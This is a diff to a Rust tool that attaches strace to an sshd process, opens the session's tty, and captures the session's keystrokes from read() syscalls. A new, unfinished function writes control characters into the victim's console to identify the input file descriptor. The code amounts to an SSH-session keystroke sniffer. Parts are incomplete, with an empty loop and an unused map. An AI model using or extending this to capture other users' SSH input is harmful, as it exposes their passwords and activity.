@@ -3,10 +3,11 @@ use hex;
 use nix::libc::{ioctl, TIOCSTI};
 use procfs::process::{self, Process};
 use regex::Regex;
+use std::collections::HashMap;
 use std::io::Write;
 use std::io::{self, BufRead, BufReader};
 use std::os::fd::AsRawFd;
-use std::process::{Command, Stdio};
+use std::process::{ChildStderr, Command, Stdio};
 use std::str::FromStr;
 
 pub fn read(pid: &str) {
@@ -19,10 +20,24 @@ pub fn read(pid: &str) {
         .spawn()
         .expect("Failed to start strace command");
 
+    println!("{}", tty_of_sshd(pid).expect("Failed to open tty"));
+
+    let file = std::fs::OpenOptions::new()
+        .read(true)
+        .open(tty_of_sshd(pid).unwrap())
+        .expect("Failed to open tty"); // TODO: Don't panic when connection closes.
+
+    let fd = file.as_raw_fd();
+
     let stderr = child.stderr.take().expect("Failed to capture stderr");
 
     let mut reader = BufReader::new(stderr);
-    let re = Regex::new(r#"(?mU)read\(8, "(.*)""#).unwrap();
+
+    // TODO: Need to figure out which exact file descriptor is being used
+
+    println!("{fd:?}");
+
+    let re = Regex::new(&format!(r#"(?mU)read\({}, "(.*)""#, fd.to_string())).unwrap();
 
     loop {
         let mut buf = String::new();
@@ -41,6 +56,23 @@ pub fn read(pid: &str) {
             println!("Connection closed");
             break;
         }
+    }
+}
+
+fn find_fd(pid: &str, reader: BufReader<ChildStderr>) {
+    let re = Regex::new(r#"(?mU)read\(([0-9]+), "(.*)""#).unwrap();
+
+    write_str(
+        &tty_of_sshd(pid).expect("Failed to get tty"),
+        " \x08\x1b\x5b\x4b",
+    );
+
+    let map = HashMap::<u32, Vec<&str>>::new();
+
+    loop {
+        // Loop till we find the string we write to their console
+        // Read every read syscall, add the chars to a map of Map<fd,Vec<char>>
+        // At the end of each loop check each vec to see if our special chars are there
     }
 }
 
